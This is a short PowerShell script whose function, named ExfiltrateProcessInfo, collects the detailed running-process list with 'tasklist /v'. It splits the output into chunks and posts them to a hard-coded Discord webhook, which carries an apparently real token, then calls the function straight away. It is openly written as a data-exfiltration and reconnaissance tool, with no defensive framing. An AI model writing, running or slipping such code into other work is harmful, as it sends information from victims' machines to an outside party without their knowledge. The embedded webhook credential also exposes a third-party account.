<#
This function retrieves the list of running processes on the system
and sends it as multiple messages to a Discord channel via a webhook if necessary.

### Steps:
1. Get the task list with detailed information (`tasklist /v`).
2. Convert the output into plain text format.
3. If the message exceeds Discord's 2000 character limit, split it into multiple messages.
4. Send each part as a separate message to Discord using a webhook.
#>

function ExfiltrateProcessInfo {
    # Step 1: Get the running processes
    $taskListOutput = tasklist /v
    
    # Step 2: Prepare the data to be sent (convert to plain text)
    $processInfo = $taskListOutput -join "`n"
    
    # Step 3: Define the Discord webhook URL (your provided webhook)
    $discordWebhookUrl = "https://discord.com/api/webhooks/1322665023029645452/SHGcTVmDG5mpVZ1DDbYXpQyrWQJ25BYUK1ID55V0C8gC3syN6lpijpw_MsoDcrNy0V2I"
    
    # Step 4: Split the content into chunks if it exceeds Discord's 2000 character limit
    $maxLength = 2000
    $chunks = @()
    
    while ($processInfo.Length -gt $maxLength) {
        # Split the content into smaller parts
        $chunks += $processInfo.Substring(0, $maxLength)
        $processInfo = $processInfo.Substring($maxLength)
    }
    
    # Add the remaining part (if any)
    if ($processInfo.Length -gt 0) {
        $chunks += $processInfo
    }

    # Step 5: Send each chunk as a separate message
    try {
        foreach ($chunk in $chunks) {
            $body = @{
                "content" = "List of running processes:`n$chunk"
            }

            # Send the POST request to Discord webhook for each chunk
            Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
            Write-Host "Process info chunk sent successfully to Discord."
        }
    }
    catch {
        Write-Host "Error while sending process info to Discord: $_"
    }
}

# Call the function to exfiltrate the process info
ExfiltrateProcessInfo
